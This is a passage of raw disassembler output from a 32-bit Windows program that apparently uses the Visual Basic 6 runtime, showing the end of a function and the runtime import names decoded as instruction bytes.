  406375:	eb 09                	jmp    0x406380
  406377:	ff 15 90 10 40 00    	call   *0x401090
  40637d:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  406380:	8b 49 0c             	mov    0xc(%ecx),%ecx
  406383:	6a 01                	push   $0x1
  406385:	03 c8                	add    %eax,%ecx
  406387:	6a 01                	push   $0x1
  406389:	51                   	push   %ecx
  40638a:	e8 0d db ff ff       	call   0x403e9c
  40638f:	8b d8                	mov    %eax,%ebx
  406391:	ff d7                	call   *%edi
  406393:	8d 55 bc             	lea    -0x44(%ebp),%edx
  406396:	52                   	push   %edx
  406397:	ff 15 98 11 40 00    	call   *0x401198
  40639d:	8b 45 14             	mov    0x14(%ebp),%eax
  4063a0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4063a3:	8b 55 a8             	mov    -0x58(%ebp),%edx
  4063a6:	56                   	push   %esi
  4063a7:	50                   	push   %eax
  4063a8:	51                   	push   %ecx
  4063a9:	53                   	push   %ebx
  4063aa:	52                   	push   %edx
  4063ab:	e8 9c da ff ff       	call   0x403e4c
  4063b0:	8b f0                	mov    %eax,%esi
  4063b2:	ff d7                	call   *%edi
  4063b4:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4063b7:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4063ba:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  4063bd:	c7 45 ac 03 00 00 00 	movl   $0x3,-0x54(%ebp)
  4063c4:	ff 15 0c 10 40 00    	call   *0x40100c
  4063ca:	68 fe 63 40 00       	push   $0x4063fe
  4063cf:	eb 1a                	jmp    0x4063eb
  4063d1:	f6 45 fc 04          	testb  $0x4,-0x4(%ebp)
  4063d5:	74 09                	je     0x4063e0
  4063d7:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4063da:	ff 15 1c 10 40 00    	call   *0x40101c
  4063e0:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4063e3:	50                   	push   %eax
  4063e4:	ff 15 98 11 40 00    	call   *0x401198
  4063ea:	c3                   	ret
  4063eb:	8d 55 a8             	lea    -0x58(%ebp),%edx
  4063ee:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4063f1:	52                   	push   %edx
  4063f2:	6a 00                	push   $0x0
  4063f4:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  4063f7:	ff 15 50 10 40 00    	call   *0x401050
  4063fd:	c3                   	ret
  4063fe:	8b 45 08             	mov    0x8(%ebp),%eax
  406401:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406404:	8b c8                	mov    %eax,%ecx
  406406:	5f                   	pop    %edi
  406407:	5e                   	pop    %esi
  406408:	5b                   	pop    %ebx
  406409:	89 11                	mov    %edx,(%ecx)
  40640b:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40640e:	89 51 04             	mov    %edx,0x4(%ecx)
  406411:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  406414:	89 51 08             	mov    %edx,0x8(%ecx)
  406417:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40641a:	89 51 0c             	mov    %edx,0xc(%ecx)
  40641d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406420:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406427:	8b e5                	mov    %ebp,%esp
  406429:	5d                   	pop    %ebp
  40642a:	c2 10 00             	ret    $0x10
  40642d:	90                   	nop
  40642e:	90                   	nop
  40642f:	90                   	nop
  406430:	9e                   	sahf
  406431:	9e                   	sahf
  406432:	9e                   	sahf
  406433:	9e                   	sahf
  406434:	5c                   	pop    %esp
  406435:	64 00 00             	add    %al,%fs:(%eax)
  406438:	ff                   	(bad)
  406439:	ff                   	(bad)
  40643a:	ff                   	(bad)
  40643b:	ff                   	(bad)
  40643c:	ff                   	(bad)
  40643d:	ff                   	(bad)
  40643e:	ff                   	(bad)
  40643f:	ff 0c 66             	decl   (%esi,%eiz,2)
  406442:	00 00                	add    %al,(%eax)
  406444:	00 10                	add    %dl,(%eax)
	...
  40645a:	00 00                	add    %al,(%eax)
  40645c:	1a 66 00             	sbb    0x0(%esi),%ah
  40645f:	00 2a                	add    %ch,(%edx)
  406461:	66 00 00             	data16 add %al,(%eax)
  406464:	34 66                	xor    $0x66,%al
  406466:	00 00                	add    %al,(%eax)
  406468:	42                   	inc    %edx
  406469:	66 00 00             	data16 add %al,(%eax)
  40646c:	52                   	push   %edx
  40646d:	66 00 00             	data16 add %al,(%eax)
  406470:	60                   	pusha
  406471:	66 00 00             	data16 add %al,(%eax)
  406474:	76 66                	jbe    0x4064dc
  406476:	00 00                	add    %al,(%eax)
  406478:	86 66 00             	xchg   %ah,0x0(%esi)
  40647b:	00 96 66 00 00 a8    	add    %dl,-0x57ffff9a(%esi)
  406481:	66 00 00             	data16 add %al,(%eax)
  406484:	b8 66 00 00 cc       	mov    $0xcc000066,%eax
  406489:	66 00 00             	data16 add %al,(%eax)
  40648c:	04 02                	add    $0x2,%al
  40648e:	00 80 dc 66 00 00    	add    %al,0x66dc(%eax)
  406494:	ea 66 00 00 f8 66 00 	ljmp   $0x66,$0xf8000066
  40649b:	00 06                	add    %al,(%esi)
  40649d:	67 00 00             	add    %al,(%bx,%si)
  4064a0:	1c 67                	sbb    $0x67,%al
  4064a2:	00 00                	add    %al,(%eax)
  4064a4:	34 67                	xor    $0x67,%al
  4064a6:	00 00                	add    %al,(%eax)
  4064a8:	44                   	inc    %esp
  4064a9:	67 00 00             	add    %al,(%bx,%si)
  4064ac:	52                   	push   %edx
  4064ad:	67 00 00             	add    %al,(%bx,%si)
  4064b0:	66 67 00 00          	data16 add %al,(%bx,%si)
  4064b4:	76 67                	jbe    0x40651d
  4064b6:	00 00                	add    %al,(%eax)
  4064b8:	53                   	push   %ebx
  4064b9:	02 00                	add    (%eax),%al
  4064bb:	80 86 67 00 00 94 67 	addb   $0x67,-0x6bffff99(%esi)
  4064c2:	00 00                	add    %al,(%eax)
  4064c4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4064c5:	67 00 00             	add    %al,(%bx,%si)
  4064c8:	ba 67 00 00 08       	mov    $0x8000067,%edx
  4064cd:	02 00                	add    (%eax),%al
  4064cf:	80 cc 67             	or     $0x67,%ah
  4064d2:	00 00                	add    %al,(%eax)
  4064d4:	e0 67                	loopne 0x40653d
  4064d6:	00 00                	add    %al,(%eax)
  4064d8:	77 02                	ja     0x4064dc
  4064da:	00 80 0d 02 00 80    	add    %al,-0x7ffffdf3(%eax)
  4064e0:	ea 67 00 00 f8 67 00 	ljmp   $0x67,$0xf8000067
  4064e7:	00 0a                	add    %cl,(%edx)
  4064e9:	68 00 00 1e 68       	push   $0x681e0000
  4064ee:	00 00                	add    %al,(%eax)
  4064f0:	3a 68 00             	cmp    0x0(%eax),%ch
  4064f3:	00 46 68             	add    %al,0x68(%esi)
  4064f6:	00 00                	add    %al,(%eax)
  4064f8:	5c                   	pop    %esp
  4064f9:	68 00 00 6c 68       	push   $0x686c0000
  4064fe:	00 00                	add    %al,(%eax)
  406500:	7a 68                	jp     0x40656a
  406502:	00 00                	add    %al,(%eax)
  406504:	8c 68 00             	mov    %gs,0x0(%eax)
  406507:	00 a0 68 00 00 ae    	add    %ah,-0x51ffff98(%eax)
  40650d:	68 00 00 bc 68       	push   $0x68bc0000
  406512:	00 00                	add    %al,(%eax)
  406514:	ca 68 00             	lret   $0x68
  406517:	00 e0                	add    %ah,%al
  406519:	68 00 00 ee 68       	push   $0x68ee0000
  40651e:	00 00                	add    %al,(%eax)
  406520:	f8                   	clc
  406521:	68 00 00 06 69       	push   $0x69060000
  406526:	00 00                	add    %al,(%eax)
  406528:	22 69 00             	and    0x0(%ecx),%ch
  40652b:	00 30                	add    %dh,(%eax)
  40652d:	69 00 00 3e 69 00    	imul   $0x693e00,(%eax),%eax
  406533:	00 c7                	add    %al,%bh
  406535:	02 00                	add    (%eax),%al
  406537:	80 54 69 00 00       	adcb   $0x0,0x0(%ecx,%ebp,2)
  40653c:	66 69 00 00 c9       	imul   $0xc900,(%eax),%ax
  406541:	02 00                	add    (%eax),%al
  406543:	80 78 69 00          	cmpb   $0x0,0x69(%eax)
  406547:	00 86 69 00 00 13    	add    %al,0x13000069(%esi)
  40654d:	02 00                	add    (%eax),%al
  40654f:	80 98 69 00 00 cd 02 	sbbb   $0x2,-0x32ffff97(%eax)
  406556:	00 80 ac 69 00 00    	add    %al,0x69ac(%eax)
  40655c:	ba 69 00 00 cc       	mov    $0xcc000069,%edx
  406561:	69 00 00 19 02 00    	imul   $0x21900,(%eax),%eax
  406567:	80 da 69             	sbb    $0x69,%dl
  40656a:	00 00                	add    %al,(%eax)
  40656c:	e4 69                	in     $0x69,%al
  40656e:	00 00                	add    %al,(%eax)
  406570:	fa                   	cli
  406571:	69 00 00 3a 02 00    	imul   $0x23a00,(%eax),%eax
  406577:	80 0a 6a             	orb    $0x6a,(%edx)
  40657a:	00 00                	add    %al,(%eax)
  40657c:	1a 6a 00             	sbb    0x0(%edx),%ch
  40657f:	00 34 6a             	add    %dh,(%edx,%ebp,2)
  406582:	00 00                	add    %al,(%eax)
  406584:	40                   	inc    %eax
  406585:	6a 00                	push   $0x0
  406587:	00 52 6a             	add    %dl,0x6a(%edx)
  40658a:	00 00                	add    %al,(%eax)
  40658c:	64 6a 00             	fs push $0x0
  40658f:	00 74 6a 00          	add    %dh,0x0(%edx,%ebp,2)
  406593:	00 82 6a 00 00 96    	add    %al,-0x69ffff96(%edx)
  406599:	6a 00                	push   $0x0
  40659b:	00 a4 6a 00 00 b6 6a 	add    %ah,0x6ab60000(%edx,%ebp,2)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	ad                   	lods   %ds:(%esi),%eax
  4065a5:	02 00                	add    (%eax),%al
  4065a7:	80 64 00 00 80       	andb   $0x80,0x0(%eax,%eax,1)
  4065ac:	c4 6a 00             	les    0x0(%edx),%ebp
  4065af:	00 d6                	add    %dl,%dh
  4065b1:	6a 00                	push   $0x0
  4065b3:	00 e4                	add    %ah,%ah
  4065b5:	6a 00                	push   $0x0
  4065b7:	00 f4                	add    %dh,%ah
  4065b9:	6a 00                	push   $0x0
  4065bb:	00 04 6b             	add    %al,(%ebx,%ebp,2)
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	18 6b 00             	sbb    %ch,0x0(%ebx)
  4065c3:	00 26                	add    %ah,(%esi)
  4065c5:	6b 00 00             	imul   $0x0,(%eax),%eax
  4065c8:	34 6b                	xor    $0x6b,%al
  4065ca:	00 00                	add    %al,(%eax)
  4065cc:	44                   	inc    %esp
  4065cd:	6b 00 00             	imul   $0x0,(%eax),%eax
  4065d0:	5c                   	pop    %esp
  4065d1:	6b 00 00             	imul   $0x0,(%eax),%eax
  4065d4:	6a 6b                	push   $0x6b
  4065d6:	00 00                	add    %al,(%eax)
  4065d8:	82 6b 00 00          	subb   $0x0,0x0(%ebx)
  4065dc:	8c 6b 00             	mov    %gs,0x0(%ebx)
  4065df:	00 9c 6b 00 00 ac 6b 	add    %bl,0x6bac0000(%ebx,%ebp,2)
  4065e6:	00 00                	add    %al,(%eax)
  4065e8:	be 6b 00 00 c8       	mov    $0xc800006b,%esi
  4065ed:	6b 00 00             	imul   $0x0,(%eax),%eax
  4065f0:	e0 6b                	loopne 0x40665d
  4065f2:	00 00                	add    %al,(%eax)
  4065f4:	ea 6b 00 00 fc 6b 00 	ljmp   $0x6b,$0xfc00006b
  4065fb:	00 06                	add    %al,(%esi)
  4065fd:	6c                   	insb   (%dx),%es:(%edi)
  4065fe:	00 00                	add    %al,(%eax)
  406600:	16                   	push   %ss
  406601:	6c                   	insb   (%dx),%es:(%edi)
  406602:	00 00                	add    %al,(%eax)
  406604:	45                   	inc    %ebp
  406605:	02 00                	add    (%eax),%al
  406607:	80 00 00             	addb   $0x0,(%eax)
  40660a:	00 00                	add    %al,(%eax)
  40660c:	4d                   	dec    %ebp
  40660d:	53                   	push   %ebx
  40660e:	56                   	push   %esi
  40660f:	42                   	inc    %edx
  406610:	56                   	push   %esi
  406611:	4d                   	dec    %ebp
  406612:	36 30 2e             	xor    %ch,%ss:(%esi)
  406615:	44                   	inc    %esp
  406616:	4c                   	dec    %esp
  406617:	4c                   	dec    %esp
  406618:	00 00                	add    %al,(%eax)
  40661a:	00 00                	add    %al,(%eax)
  40661c:	5f                   	pop    %edi
  40661d:	5f                   	pop    %edi
  40661e:	76 62                	jbe    0x406682
  406620:	61                   	popa
  406621:	56                   	push   %esi
  406622:	61                   	popa
  406623:	72 54                	jb     0x406679
  406625:	73 74                	jae    0x40669b
  406627:	47                   	inc    %edi
  406628:	74 00                	je     0x40662a
  40662a:	00 00                	add    %al,(%eax)
  40662c:	5f                   	pop    %edi
  40662d:	43                   	inc    %ebx
  40662e:	49                   	dec    %ecx
  40662f:	63 6f 73             	arpl   %ebp,0x73(%edi)
  406632:	00 00                	add    %al,(%eax)
  406634:	00 00                	add    %al,(%eax)
  406636:	5f                   	pop    %edi
  406637:	61                   	popa
  406638:	64 6a 5f             	fs push $0x5f
  40663b:	66 70 74             	data16 jo 0x4066b2
  40663e:	61                   	popa
  40663f:	6e                   	outsb  %ds:(%esi),(%dx)
  406640:	00 00                	add    %al,(%eax)
  406642:	00 00                	add    %al,(%eax)
  406644:	5f                   	pop    %edi
  406645:	5f                   	pop    %edi
  406646:	76 62                	jbe    0x4066aa
  406648:	61                   	popa
  406649:	56                   	push   %esi
  40664a:	61                   	popa
  40664b:	72 4d                	jb     0x40669a
  40664d:	6f                   	outsl  %ds:(%esi),(%dx)
  40664e:	76 65                	jbe    0x4066b5
  406650:	00 00                	add    %al,(%eax)
  406652:	00 00                	add    %al,(%eax)
  406654:	5f                   	pop    %edi
  406655:	5f                   	pop    %edi
  406656:	76 62                	jbe    0x4066ba
  406658:	61                   	popa
  406659:	53                   	push   %ebx
  40665a:	74 72                	je     0x4066ce
  40665c:	49                   	dec    %ecx
  40665d:	34 00                	xor    $0x0,%al
  40665f:	00 00                	add    %al,(%eax)
  406661:	00 5f 5f             	add    %bl,0x5f(%edi)
  406664:	76 62                	jbe    0x4066c8
  406666:	61                   	popa
  406667:	56                   	push   %esi
  406668:	61                   	popa
  406669:	72 56                	jb     0x4066c1
  40666b:	61                   	popa
  40666c:	72 67                	jb     0x4066d5
  40666e:	4e                   	dec    %esi
  40666f:	6f                   	outsl  %ds:(%esi),(%dx)
  406670:	66 72 65             	data16 jb 0x4066d8
  406673:	65 00 00             	add    %al,%gs:(%eax)
  406676:	00 00                	add    %al,(%eax)
  406678:	5f                   	pop    %edi
  406679:	5f                   	pop    %edi
  40667a:	76 62                	jbe    0x4066de
  40667c:	61                   	popa
  40667d:	41                   	inc    %ecx
  40667e:	72 79                	jb     0x4066f9
  406680:	4d                   	dec    %ebp
  406681:	6f                   	outsl  %ds:(%esi),(%dx)
  406682:	76 65                	jbe    0x4066e9
  406684:	00 00                	add    %al,(%eax)
  406686:	00 00                	add    %al,(%eax)
  406688:	5f                   	pop    %edi
  406689:	5f                   	pop    %edi
  40668a:	76 62                	jbe    0x4066ee
  40668c:	61                   	popa
  40668d:	46                   	inc    %esi
  40668e:	72 65                	jb     0x4066f5
  406690:	65 56                	gs push %esi
  406692:	61                   	popa
  406693:	72 00                	jb     0x406695
  406695:	00 00                	add    %al,(%eax)
  406697:	00 5f 5f             	add    %bl,0x5f(%edi)
  40669a:	76 62                	jbe    0x4066fe
  40669c:	61                   	popa
  40669d:	53                   	push   %ebx
  40669e:	74 72                	je     0x406712
  4066a0:	56                   	push   %esi
  4066a1:	61                   	popa
  4066a2:	72 4d                	jb     0x4066f1
  4066a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4066a5:	76 65                	jbe    0x40670c
  4066a7:	00 00                	add    %al,(%eax)
  4066a9:	00 5f 5f             	add    %bl,0x5f(%edi)
  4066ac:	76 62                	jbe    0x406710
  4066ae:	61                   	popa
  4066af:	4c                   	dec    %esp
  4066b0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4066b2:	42                   	inc    %edx
  4066b3:	73 74                	jae    0x406729
  4066b5:	72 00                	jb     0x4066b7
  4066b7:	00 00                	add    %al,(%eax)
  4066b9:	00 5f 5f             	add    %bl,0x5f(%edi)
  4066bc:	76 62                	jbe    0x406720
  4066be:	61                   	popa
  4066bf:	46                   	inc    %esi
  4066c0:	72 65                	jb     0x406727
  4066c2:	65 56                	gs push %esi
  4066c4:	61                   	popa
  4066c5:	72 4c                	jb     0x406713
  4066c7:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  4066ce:	5f                   	pop    %edi
  4066cf:	61                   	popa
  4066d0:	64 6a 5f             	fs push $0x5f
  4066d3:	66 64 69 76 5f 6d 36 	imul   $0x366d,%fs:0x5f(%esi),%si
  4066da:	34 00                	xor    $0x0,%al
  4066dc:	00 00                	add    %al,(%eax)
  4066de:	5f                   	pop    %edi
  4066df:	61                   	popa
  4066e0:	64 6a 5f             	fs push $0x5f
  4066e3:	66 70 72             	data16 jo 0x406758
  4066e6:	65 6d                	gs insl (%dx),%es:(%edi)
  4066e8:	31 00                	xor    %eax,(%eax)
  4066ea:	00 00                	add    %al,(%eax)
  4066ec:	5f                   	pop    %edi
  4066ed:	5f                   	pop    %edi
  4066ee:	76 62                	jbe    0x406752
  4066f0:	61                   	popa
  4066f1:	52                   	push   %edx
  4066f2:	65 73 75             	gs jae 0x40676a
  4066f5:	6d                   	insl   (%dx),%es:(%edi)
  4066f6:	65 00 00             	add    %al,%gs:(%eax)
  4066f9:	00 5f 5f             	add    %bl,0x5f(%edi)
  4066fc:	76 62                	jbe    0x406760
  4066fe:	61                   	popa
  4066ff:	53                   	push   %ebx
  406700:	74 72                	je     0x406774
  406702:	43                   	inc    %ebx
  406703:	61                   	popa
  406704:	74 00                	je     0x406706
  406706:	00 00                	add    %al,(%eax)
  406708:	5f                   	pop    %edi
  406709:	5f                   	pop    %edi
  40670a:	76 62                	jbe    0x40676e
  40670c:	61                   	popa
  40670d:	53                   	push   %ebx
  40670e:	65 74 53             	gs je  0x406764
  406711:	79 73                	jns    0x406786
  406713:	74 65                	je     0x40677a
  406715:	6d                   	insl   (%dx),%es:(%edi)
  406716:	45                   	inc    %ebp
  406717:	72 72                	jb     0x40678b
  406719:	6f                   	outsl  %ds:(%esi),(%dx)
  40671a:	72 00                	jb     0x40671c
  40671c:	00 00                	add    %al,(%eax)
  40671e:	5f                   	pop    %edi
  40671f:	5f                   	pop    %edi
  406720:	76 62                	jbe    0x406784
  406722:	61                   	popa
  406723:	48                   	dec    %eax
  406724:	72 65                	jb     0x40678b
  406726:	73 75                	jae    0x40679d
  406728:	6c                   	insb   (%dx),%es:(%edi)
  406729:	74 43                	je     0x40676e
  40672b:	68 65 63 6b 4f       	push   $0x4f6b6365
  406730:	62 6a 00             	bound  %ebp,0x0(%edx)
  406733:	00 00                	add    %al,(%eax)
  406735:	00 5f 61             	add    %bl,0x61(%edi)
  406738:	64 6a 5f             	fs push $0x5f
  40673b:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  406742:	32 00                	xor    (%eax),%al
  406744:	00 00                	add    %al,(%eax)
  406746:	5f                   	pop    %edi
  406747:	5f                   	pop    %edi
  406748:	76 62                	jbe    0x4067ac
  40674a:	61                   	popa
  40674b:	41                   	inc    %ecx
  40674c:	72 79                	jb     0x4067c7
  40674e:	56                   	push   %esi
  40674f:	61                   	popa
  406750:	72 00                	jb     0x406752
  406752:	00 00                	add    %al,(%eax)
  406754:	5f                   	pop    %edi
  406755:	5f                   	pop    %edi
  406756:	76 62                	jbe    0x4067ba
  406758:	61                   	popa
  406759:	41                   	inc    %ecx
  40675a:	72 79                	jb     0x4067d5
  40675c:	44                   	inc    %esp
  40675d:	65 73 74             	gs jae 0x4067d4
  406760:	72 75                	jb     0x4067d7
  406762:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  406766:	00 00                	add    %al,(%eax)
  406768:	5f                   	pop    %edi
  406769:	5f                   	pop    %edi
  40676a:	76 62                	jbe    0x4067ce
  40676c:	61                   	popa
  40676d:	45                   	inc    %ebp
  40676e:	78 69                	js     0x4067d9
  406770:	74 50                	je     0x4067c2
  406772:	72 6f                	jb     0x4067e3
  406774:	63 00                	arpl   %eax,(%eax)
  406776:	00 00                	add    %al,(%eax)
  406778:	5f                   	pop    %edi
  406779:	5f                   	pop    %edi
  40677a:	76 62                	jbe    0x4067de
  40677c:	61                   	popa
  40677d:	4f                   	dec    %edi
  40677e:	6e                   	outsb  %ds:(%esi),(%dx)
  40677f:	45                   	inc    %ebp
  406780:	72 72                	jb     0x4067f4
  406782:	6f                   	outsl  %ds:(%esi),(%dx)
  406783:	72 00                	jb     0x406785
  406785:	00 00                	add    %al,(%eax)
  406787:	00 5f 5f             	add    %bl,0x5f(%edi)
  40678a:	76 62                	jbe    0x4067ee
  40678c:	61                   	popa
  40678d:	4f                   	dec    %edi
  40678e:	62 6a 53             	bound  %ebp,0x53(%edx)
  406791:	65 74 00             	gs je  0x406794
  406794:	00 00                	add    %al,(%eax)
  406796:	5f                   	pop    %edi
  406797:	61                   	popa
  406798:	64 6a 5f             	fs push $0x5f
  40679b:	66 64 69 76 5f 6d 31 	imul   $0x316d,%fs:0x5f(%esi),%si
  4067a2:	36 69 00 00 00 00 5f 	imul   $0x5f000000,%ss:(%eax),%eax
  4067a9:	5f                   	pop    %edi
  4067aa:	76 62                	jbe    0x40680e
  4067ac:	61                   	popa
  4067ad:	4f                   	dec    %edi
  4067ae:	62 6a 53             	bound  %ebp,0x53(%edx)
  4067b1:	65 74 41             	gs je  0x4067f5
  4067b4:	64 64 72 65          	fs fs jb 0x40681d
  4067b8:	66 00 00             	data16 add %al,(%eax)
  4067bb:	00 5f 61             	add    %bl,0x61(%edi)
  4067be:	64 6a 5f             	fs push $0x5f
  4067c1:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  4067c8:	31 36                	xor    %esi,(%esi)
  4067ca:	69 00 00 00 5f 5f    	imul   $0x5f5f0000,(%eax),%eax
  4067d0:	76 62                	jbe    0x406834
  4067d2:	61                   	popa
  4067d3:	42                   	inc    %edx
  4067d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d5:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d6:	6c                   	insb   (%dx),%es:(%edi)
  4067d7:	56                   	push   %esi
  4067d8:	61                   	popa
  4067d9:	72 4e                	jb     0x406829
  4067db:	75 6c                	jne    0x406849
  4067dd:	6c                   	insb   (%dx),%es:(%edi)
  4067de:	00 00                	add    %al,(%eax)
  4067e0:	00 00                	add    %al,(%eax)
  4067e2:	5f                   	pop    %edi
  4067e3:	43                   	inc    %ebx
  4067e4:	49                   	dec    %ecx
  4067e5:	73 69                	jae    0x406850
  4067e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4067e8:	00 00                	add    %al,(%eax)
  4067ea:	00 00                	add    %al,(%eax)
  4067ec:	5f                   	pop    %edi
  4067ed:	5f                   	pop    %edi
  4067ee:	76 62                	jbe    0x406852
  4067f0:	61                   	popa
  4067f1:	43                   	inc    %ebx
  4067f2:	68 6b 73 74 6b       	push   $0x6b74736b
  4067f7:	00 00                	add    %al,(%eax)
  4067f9:	00 5f 5f             	add    %bl,0x5f(%edi)
  4067fc:	76 62                	jbe    0x406860
  4067fe:	61                   	popa
  4067ff:	46                   	inc    %esi
  406800:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  406807:	65 
  406808:	00 00                	add    %al,(%eax)
  40680a:	00 00                	add    %al,(%eax)
  40680c:	45                   	inc    %ebp
  40680d:	56                   	push   %esi
  40680e:	45                   	inc    %ebp
  40680f:	4e                   	dec    %esi
  406810:	54                   	push   %esp
  406811:	5f                   	pop    %edi
  406812:	53                   	push   %ebx
  406813:	49                   	dec    %ecx
  406814:	4e                   	dec    %esi
  406815:	4b                   	dec    %ebx
  406816:	5f                   	pop    %edi
  406817:	41                   	inc    %ecx
  406818:	64 64 52             	fs fs push %edx
  40681b:	65 66 00 00          	data16 add %al,%gs:(%eax)
  40681f:	00 5f 5f             	add    %bl,0x5f(%edi)
  406822:	76 62                	jbe    0x406886
  406824:	61                   	popa
  406825:	47                   	inc    %edi
  406826:	65 6e                	outsb  %gs:(%esi),(%dx)
  406828:	65 72 61             	gs jb  0x40688c
  40682b:	74 65                	je     0x406892
  40682d:	42                   	inc    %edx
  40682e:	6f                   	outsl  %ds:(%esi),(%dx)
  40682f:	75 6e                	jne    0x40689f
  406831:	64 73 45             	fs jae 0x406879
  406834:	72 72                	jb     0x4068a8
  406836:	6f                   	outsl  %ds:(%esi),(%dx)
  406837:	72 00                	jb     0x406839
  406839:	00 00                	add    %al,(%eax)
  40683b:	00 5f 5f             	add    %bl,0x5f(%edi)
  40683e:	76 62                	jbe    0x4068a2
  406840:	61                   	popa
  406841:	47                   	inc    %edi
  406842:	65 74 33             	gs je  0x406878
  406845:	00 00                	add    %al,(%eax)
  406847:	00 5f 5f             	add    %bl,0x5f(%edi)
  40684a:	76 62                	jbe    0x4068ae
  40684c:	61                   	popa
  40684d:	41                   	inc    %ecx
  40684e:	72 79                	jb     0x4068c9
  406850:	43                   	inc    %ebx
  406851:	6f                   	outsl  %ds:(%esi),(%dx)
  406852:	6e                   	outsb  %ds:(%esi),(%dx)
  406853:	73 74                	jae    0x4068c9
  406855:	72 75                	jb     0x4068cc
  406857:	63 74 32 00          	arpl   %esi,0x0(%edx,%esi,1)
  40685b:	00 00                	add    %al,(%eax)
  40685d:	00 5f 5f             	add    %bl,0x5f(%edi)
  406860:	76 62                	jbe    0x4068c4
  406862:	61                   	popa
  406863:	56                   	push   %esi
  406864:	61                   	popa
  406865:	72 54                	jb     0x4068bb
  406867:	73 74                	jae    0x4068dd
  406869:	45                   	inc    %ebp
  40686a:	71 00                	jno    0x40686c
  40686c:	00 00                	add    %al,(%eax)
  40686e:	5f                   	pop    %edi
  40686f:	5f                   	pop    %edi
  406870:	76 62                	jbe    0x4068d4
  406872:	61                   	popa
  406873:	4f                   	dec    %edi
  406874:	62 6a 56             	bound  %ebp,0x56(%edx)
  406877:	61                   	popa
  406878:	72 00                	jb     0x40687a
  40687a:	00 00                	add    %al,(%eax)
  40687c:	44                   	inc    %esp
  40687d:	6c                   	insb   (%dx),%es:(%edi)
  40687e:	6c                   	insb   (%dx),%es:(%edi)
  40687f:	46                   	inc    %esi
  406880:	75 6e                	jne    0x4068f0
  406882:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  406886:	6e                   	outsb  %ds:(%esi),(%dx)
  406887:	43                   	inc    %ebx
  406888:	61                   	popa
  406889:	6c                   	insb   (%dx),%es:(%edi)
  40688a:	6c                   	insb   (%dx),%es:(%edi)
  40688b:	00 00                	add    %al,(%eax)
  40688d:	00 5f 5f             	add    %bl,0x5f(%edi)
  406890:	76 62                	jbe    0x4068f4
  406892:	61                   	popa
  406893:	56                   	push   %esi
  406894:	61                   	popa
  406895:	72 4c                	jb     0x4068e3
  406897:	61                   	popa
  406898:	74 65                	je     0x4068ff
  40689a:	4d                   	dec    %ebp
  40689b:	65 6d                	gs insl (%dx),%es:(%edi)
  40689d:	53                   	push   %ebx
  40689e:	74 00                	je     0x4068a0
  4068a0:	00 00                	add    %al,(%eax)
  4068a2:	5f                   	pop    %edi
  4068a3:	5f                   	pop    %edi
  4068a4:	76 62                	jbe    0x406908
  4068a6:	61                   	popa
  4068a7:	4c                   	dec    %esp
  4068a8:	62 6f 75             	bound  %ebp,0x75(%edi)
  4068ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4068ac:	64 00 00             	add    %al,%fs:(%eax)
  4068af:	00 5f 61             	add    %bl,0x61(%edi)
  4068b2:	64 6a 5f             	fs push $0x5f
  4068b5:	66 70 61             	data16 jo 0x406919
  4068b8:	74 61                	je     0x40691b
  4068ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4068bb:	00 00                	add    %al,(%eax)
  4068bd:	00 5f 5f             	add    %bl,0x5f(%edi)
  4068c0:	76 62                	jbe    0x406924
  4068c2:	61                   	popa
  4068c3:	52                   	push   %edx
  4068c4:	65 64 69 6d 00 00 00 	gs imul $0x45000000,%fs:0x0(%ebp),%ebp
  4068cb:	00 45 
  4068cd:	56                   	push   %esi
  4068ce:	45                   	inc    %ebp
  4068cf:	4e                   	dec    %esi
  4068d0:	54                   	push   %esp
  4068d1:	5f                   	pop    %edi
  4068d2:	53                   	push   %ebx
  4068d3:	49                   	dec    %ecx
  4068d4:	4e                   	dec    %esi
  4068d5:	4b                   	dec    %ebx
  4068d6:	5f                   	pop    %edi
  4068d7:	52                   	push   %edx
  4068d8:	65 6c                	gs insb (%dx),%es:(%edi)
  4068da:	65 61                	gs popa
  4068dc:	73 65                	jae    0x406943
  4068de:	00 00                	add    %al,(%eax)
  4068e0:	00 00                	add    %al,(%eax)
  4068e2:	5f                   	pop    %edi
  4068e3:	5f                   	pop    %edi
  4068e4:	76 62                	jbe    0x406948
  4068e6:	61                   	popa
  4068e7:	55                   	push   %ebp
  4068e8:	49                   	dec    %ecx
  4068e9:	31 49 32             	xor    %ecx,0x32(%ecx)
  4068ec:	00 00                	add    %al,(%eax)
  4068ee:	00 00                	add    %al,(%eax)
  4068f0:	5f                   	pop    %edi
  4068f1:	43                   	inc    %ebx
  4068f2:	49                   	dec    %ecx
  4068f3:	73 71                	jae    0x406966
  4068f5:	72 74                	jb     0x40696b
  4068f7:	00 00                	add    %al,(%eax)
  4068f9:	00 5f 5f             	add    %bl,0x5f(%edi)
  4068fc:	76 62                	jbe    0x406960
  4068fe:	61                   	popa
